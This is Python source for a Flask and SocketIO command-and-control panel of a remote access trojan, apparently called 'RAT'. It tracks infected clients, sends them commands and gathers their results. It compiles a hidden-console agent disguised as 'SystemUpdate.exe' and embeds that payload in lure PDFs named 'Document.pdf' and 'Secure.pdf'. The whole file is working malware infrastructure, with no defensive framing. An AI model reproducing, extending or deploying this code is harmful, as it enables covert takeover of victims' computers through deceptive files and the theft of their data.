# app.py - Panel Server
from flask import Flask, render_template, request, jsonify, send_file
from flask_socketio import SocketIO, emit
from flask_cors import CORS
import json, os, random, string, subprocess, time, requests, base64
app = Flask(__name__)
app.config['SECRET_KEY'] = ''.join(random.choices(string.ascii_letters + string.digits, k=50))
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
clients = {}
results = {}

@app.route('/')
def index(): return render_template('admincontrol.html')

@app.route('/api/clients')
def get_clients():
    return jsonify([{'id':k,'os':v.get('os','Unknown'),'status':v.get('status','offline')} for k,v in clients.items()])

@app.route('/api/command', methods=['POST'])
def send_command():
    data = request.json
    device_id = data.get('id')
    action = data.get('action')
    params = data.get('params', {})
    if device_id not in clients:
        return jsonify({'status': 'error', 'msg': 'Device offline'})
    socketio.emit('command', {'action': action, 'params': params}, room=device_id)
    return jsonify({'status': 'sent', 'device': device_id})

@app.route('/api/result/<device_id>')
def get_result(device_id):
    return jsonify(results.get(device_id, {'status': 'pending', 'result': None}))

@app.route('/download_agent')
def download_agent():
    with open('agent.py', 'r') as f:
        agent_code = f.read()
    with open('agent_temp.py', 'w') as f:
        f.write(agent_code.replace('https://RAT.onrender.com', request.host_url))
    try:
        subprocess.run(['pyinstaller', '--onefile', '--noconsole', '--noconfirm', '--distpath', './', 'agent_temp.py'], timeout=30, capture_output=True)
        if os.path.exists('agent_temp.exe'):
            return send_file('agent_temp.exe', as_attachment=True, download_name='SystemUpdate.exe')
    except: pass
    return send_file('agent_temp.py', as_attachment=True, download_name='SystemUpdate.py')

@app.route('/generate_pdf')
def generate_pdf():
    with open('agent.py', 'r') as f:
        agent_code = f.read()
    with open('agent_temp.py', 'w') as f:
        f.write(agent_code.replace('https://RAT.onrender.com', request.host_url))
    try:
        subprocess.run(['pyinstaller', '--onefile', '--noconsole', '--noconfirm', '--distpath', './', 'agent_temp.py'], timeout=30, capture_output=True)
        exe_file = 'agent_temp.exe'
    except:
        exe_file = 'agent_temp.py'
    with open(exe_file, 'rb') as f:
        exe_data = f.read()
    pdf = f'''%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R/Contents 4 0 R/Resources<</ProcSet[/PDF]>>>>endobj
4 0 obj<</Length 50>>stream BT /F1 24 Tf 100 700 Td (Loading...) Tj ET endstream endobj
trailer<</Root 1 0 R>>%%EOF\n{base64.b64encode(exe_data).decode()}'''
    with open('doc.pdf','wb') as f: f.write(pdf.encode())
    return send_file('doc.pdf', as_attachment=True, download_name='Document.pdf')

@app.route('/crypt_pdf', methods=['POST'])
def crypt_pdf():
    file = request.files.get('file')
    if not file: return jsonify({'error': 'No file'})
    original = f'temp_{random.randint(1000,9999)}.pdf'
    file.save(original)
    try:
        with open('agent_temp.exe', 'rb') as f: exe = f.read()
    except:
        with open('agent_temp.py', 'rb') as f: exe = f.read()
    with open(original, 'rb') as f: pdf = f.read()
    out = f'crypt_{random.randint(1000,9999)}.pdf'
    with open(out, 'wb') as f: f.write(pdf + b'\n%' + base64.b64encode(exe) + b'\n%')
    os.remove(original)
    return send_file(out, as_attachment=True, download_name='Secure.pdf')

@socketio.on('connect')
def handle_connect(): pass

@socketio.on('register')
def handle_register(data):
    device_id = data.get('id')
    clients[device_id] = {'os': data.get('os', 'Unknown'), 'status': 'online', 'last_seen': time.time()}
    emit('registered', {'status': 'ok'})

@socketio.on('result')
def handle_result(data):
    device_id = data.get('id')
    results[device_id] = {'action': data.get('action'), 'status': data.get('status'), 'result': data.get('result')}
    emit('new_result', data, broadcast=True)

@socketio.on('disconnect')
def handle_disconnect(): pass

if __name__ == '__main__':
    print('Done Momok')
    socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)